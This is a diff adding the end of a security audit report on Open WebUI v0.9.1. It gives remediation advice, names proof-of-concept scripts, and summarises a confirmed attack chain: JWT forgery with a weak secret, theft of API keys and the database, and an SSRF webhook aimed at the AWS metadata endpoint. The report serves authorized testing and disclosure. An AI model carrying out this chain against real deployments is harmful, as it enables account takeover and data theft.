+5. **[MEDIUM] Restrict `/users/search` to admin role.** Or filter `email`/`id` from
+   non-admin responses. Restrict `/admin/details` to verified users (not pending).
+
+6. **[LOW] Add rate limiting to signup.** Prevent automated account creation used to
+   bootstrap the attack chain.
+
+---
+
+## PoC Scripts Reference
+
+| Script | Demonstrates |
+|---|---|
+| `test_environment.py` | Docker test environment setup |
+| `exploit_jwt_forgery.py` | Finding 1: JWT forgery |
+| `exploit_admin_data_theft.py` | Findings 2 & 3: API key + DB exfiltration |
+| `exploit_ssrf_webhook.py` | Finding 4: SSRF via webhook |
+| `exploit_chain.py` | Full end-to-end attack chain |
+
+All scripts accept `--target <url>` and produce structured output with `[+]`, `[-]`,
+`[*]`, `[!]` prefixes. Run `python3 <script> --help` for options.
+
+---
+
+## Confirmed Test Results
+
+All exploits were executed against Open WebUI v0.9.1 running in Docker with
+`WEBUI_SECRET_KEY=t0p-s3cr3t`. Evidence output files are in `autofyn_audit/evidence/`.
+
+| Exploit | Status | Key Result |
+|---|---|---|
+| JWT Forgery (`exploit_jwt_forgery.py`) | **CONFIRMED** | Forged admin JWT accepted; GET /openai/config returned 200 |
+| Admin Data Theft (`exploit_admin_data_theft.py`) | **CONFIRMED** | 1 API key stolen, 3 users enumerated, 548 KB database downloaded |
+| SSRF Webhook (`exploit_ssrf_webhook.py`) | **CONFIRMED** | AWS metadata URL accepted as webhook with no validation |
+| Full Attack Chain (`exploit_chain.py`) | **CONFIRMED** | All 4 phases completed: signup -> JWT forgery -> data theft -> SSRF |
+
+### Attack Chain Output Summary
+
+```
+Phase 1 — Initial Access      : Signed up regular user account
+Phase 2 — Privilege Escalation : Forged admin JWT (secret: 't0p-s3cr3t')
+Phase 3 — Data Exfiltration    :
+  OpenAI API keys stolen : 1
+  Users enumerated       : 5
+  Database downloaded    : True (548 KB)
+Phase 4 — Persistent Access    : SSRF webhook set to AWS metadata endpoint
+```
+
+---
+
+*This report was produced for authorized security testing purposes only.*
+*Unauthorized use of these techniques against systems you do not own is illegal.*
